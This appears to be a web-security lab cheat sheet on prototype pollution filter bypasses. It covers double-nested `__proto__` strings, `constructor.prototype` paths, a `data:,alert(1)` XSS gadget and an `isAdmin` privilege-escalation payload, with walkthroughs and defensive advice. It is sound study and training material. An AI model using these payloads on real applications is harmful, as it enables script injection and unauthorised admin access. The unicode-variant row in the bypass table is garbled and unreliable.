# Prototype pollution - Advanced bypass (input filter evasion)

When apps block the `__proto__` key in user input, the `constructor.prototype` path and double-nested `__proto__` tricks bypass those filters to still reach `Object.prototype`. Key insight: defensive regex / string-match filters strip one occurrence but don't recursively sanitize or block alternative paths.

## Quick reference

```
# Filter strips "__proto__" once -> double-nest bypasses it
/?__pro__proto__to__[transport_url]=data:,alert(1)
# sanitizer sees "__proto__" inside, strips it -> remaining string = "__proto__"

# Alternative double-nesting forms
/?__pro__proto__to__.foo=bar
/?construct__or__.prototype.foo=bar

# constructor.prototype vector (client-side query string)
/?constructor.prototype.foo=bar
/?constructor[prototype][foo]=bar

# constructor.prototype vector (server-side JSON)
{"address":"x","constructor":{"prototype":{"isAdmin":true}}}

# JSON bracket notation
{"address":"x","constructor":{"prototype":{"isAdmin":true,"status":555}}}
```

## Root cause

Many server-side sanitizers and client-side URL parsers check for `__proto__` as a literal key and remove it, or check for `constructor.prototype` as a literal string. Recursive merge functions may process the sanitized key, unaware that stripping one keyword from a double-nested string recreates the dangerous key. Alternatively, `constructor.prototype` is a completely different property chain that reaches the same `Object.prototype` target but uses a different lookup path.

## Find it

1. If `/?__proto__[foo]=bar` -> Object.prototype NOT polluted -> filter active.
2. Try `/?__pro__proto__to__[foo]=bar` -> if Object.prototype shows `foo` -> double-nest bypass works.
3. Try `/?constructor.prototype.foo=bar` -> if Object.prototype shows `foo` -> constructor.prototype vector works.
4. Server-side: if `"__proto__":{"isAdmin":true}` is rejected or stripped -> try `"constructor":{"prototype":{"isAdmin":true}}`.
5. Use Param Miner "Server-side prototype pollution" scan - it tests multiple vectors automatically.

## Technique

**Lab 4 - Client-side flawed sanitization:**
1. `/?__proto__[foo]=bar` -> Object.prototype unchanged -> filter strips `__proto__`.
2. `/?__proto__.foo=bar` -> also blocked.
3. `/?constructor.prototype.foo=bar` -> also blocked.
4. Double-nest: `/?__pro__proto__to__[foo]=bar` -> Object.prototype shows `foo` -> bypass confirmed.
   Sanitizer logic: removes `__proto__` as a substring -> `__pro[REMOVED]to__` -> `__proto__`.
5. Exploit: `/?__pro__proto__to__[transport_url]=data:,alert(1)` -> transport_url gadget -> XSS.

**Lab 8 - Server-side filter bypass:**
1. POST /my-account/change-address with `"__proto__":{"isAdmin":true}` -> stripped / rejected.
2. Try `"constructor":{"prototype":{"isAdmin":true}}` -> server merges using `obj[constructor][prototype][isAdmin] = true` -> `Object.prototype.isAdmin = true` -> response shows `"isAdmin":true`.
3. Admin panel accessible -> delete carlos.

## Payload arsenal

```
# Client-side - double-nested __proto__ (bypass "strip __proto__" filters)
/?__pro__proto__to__[foo]=bar
/?__pro__proto__to__.foo=bar
/?__pro__proto__to__[transport_url]=data:,alert(1)

# Client-side - construct__or__.prototype bypass
/?construct__or__.prototype.foo=bar

# Client-side - constructor.prototype (if only __proto__ is blocked)
/?constructor.prototype.foo=bar
/?constructor[prototype][foo]=bar
/#constructor[prototype][foo]=bar

# Server-side JSON - constructor.prototype
{"__proto__":{"x":1}}  -> rejected?
{"constructor":{"prototype":{"isAdmin":true}}}  -> bypass

# Server-side JSON - combined detection + escalation
{"constructor":{"prototype":{"isAdmin":true,"status":555}}}
```

## Bypasses

| Filter | Bypass |
|---|---|
| Strips `__proto__` substring once | Double-nest: `__pro__proto__to__` -> strip `__proto__` -> left with `__proto__` |
| Blocks `__proto__` key in JSON | Use `constructor.prototype` path |
| Blocks both `__proto__` and `constructor` | Try `__proto__` in URL hash vs JSON body - different code paths may differ |
| Sanitizer is recursive | Try unicode variants: `__proto__` (JSON unicode escapes) |
| Recursive sanitizer that handles all variants | Out of scope for these labs - true defense requires allowlist merge, not denylist |

## Exploitation walkthrough

**Client-side (double-nested):**
1. Confirm filter: `/?__proto__[x]=y` -> Object.prototype clean.
2. Try double-nest: `/?__pro__proto__to__[x]=y` -> Object.prototype.x = "y" -> bypass confirmed.
3. Inject gadget: `/?__pro__proto__to__[transport_url]=data:,alert(1)` -> XSS fires.

**Server-side (constructor.prototype):**
1. `"__proto__":{"isAdmin":true}` stripped -> no change in response.
2. `"constructor":{"prototype":{"isAdmin":true}}` -> response echoes `"isAdmin":true` -> admin access.
3. Delete carlos via admin panel.

## Chaining

- Bypass -> privilege escalation -> [Server-side](../Server-side/) for RCE / exfil payloads
- Client-side bypass -> DOM XSS -> [Client-side](../Client-side/) gadget exploitation
- Filter evasion for PP + [XSS/WAF-filter-bypass](../../XSS/WAF-filter-bypass/) share bypass mindset

## Tools

- **DevTools Console** - verify `Object.prototype` after each bypass attempt
- **Burp Repeater** - test server-side bypass payloads and observe response changes
- **Param Miner** - automated multi-vector PP probing including constructor.prototype
- **DOM Invader** - client-side scan tests multiple vectors automatically

## Labs

### Client-side prototype pollution via flawed sanitization [Practitioner]
`__proto__[x]=y` and `constructor.prototype.x=y` both blocked. Double-nest bypass: `/?__pro__proto__to__[transport_url]=data:,alert(1)` - sanitizer strips `__proto__` substring once, leaving `__proto__` again. Key insight: substring-based denylist filters are trivially bypassed by nesting the blocked keyword inside itself.

### Bypassing flawed input filters for server-side prototype pollution [Practitioner]
`"__proto__":{"isAdmin":true}` filtered. `"constructor":{"prototype":{"isAdmin":true}}` merges via `obj[constructor][prototype]` path -> `Object.prototype.isAdmin = true` -> admin access -> delete carlos. Key insight: `constructor.prototype` and `__proto__` both reach `Object.prototype` but via different property lookup paths - blocking one doesn't block the other.

## Real-world notes

- True defense: use `Object.create(null)` for merge targets (no prototype chain), or use an allowlist merge that only copies known-safe keys.
- `JSON.parse` does NOT protect against PP - the key `__proto__` is parsed as a regular string key and merged into the target by the merge function.
- Modern lodash (4.17.21+) blocks `__proto__` and `constructor` but pre-patched versions are common in legacy apps.
- Double-nested bypass relies on a one-pass string-replace - most production sanitizers today use recursive checks, but many codebases patched PP quickly with naive string replace.

## References

- https://portswigger.net/web-security/prototype-pollution/client-side
- https://portswigger.net/web-security/prototype-pollution/preventing
